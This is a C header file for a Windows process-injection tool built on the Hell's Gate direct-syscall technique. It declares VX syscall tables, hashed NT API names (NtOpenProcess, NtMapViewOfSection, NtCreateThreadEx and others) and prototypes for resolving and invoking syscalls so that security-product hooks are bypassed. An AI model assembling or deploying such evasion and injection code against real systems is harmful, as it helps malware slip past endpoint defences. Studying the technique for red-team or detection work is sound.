#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Debug messages
#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

// Function hashes
#define NtOpenProcess_HASH 0x14023472240A509D
#define NtCreateSection_HASH 0x0903D9BEC019D655
#define NtMapViewOfSection_HASH 0x67CF1430F2B39CCF
#define NtUnmapViewOfSection_HASH 0xDA83D6D660130552
#define NtCreateThreadEx_HASH 0x297F11A1B86E8755
#define NtWaitForSingleObject_HASH 0xD4C9894C2B8ECB81
#define NtClose_HASH 0xAAAA38FF81D313C2

// VX Tables for Hell's Gate
typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;
    DWORD64 dwHash;
    WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtOpenProcess;
    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection; 
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
    VX_TABLE_ENTRY NtClose;
} VX_TABLE, * PVX_TABLE;

// Functions prototypes for direct syscall invokation
extern VOID PrepareSyscall(WORD wSystemCall);
extern RunSyscall();

PTEB RtlGetThreadEnvironmentBlock();
DWORD64 djb2(PBYTE str);
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len);
VOID PrintHashes();
BOOL InitializeDirectSyscalls(IN PVX_TABLE Table);

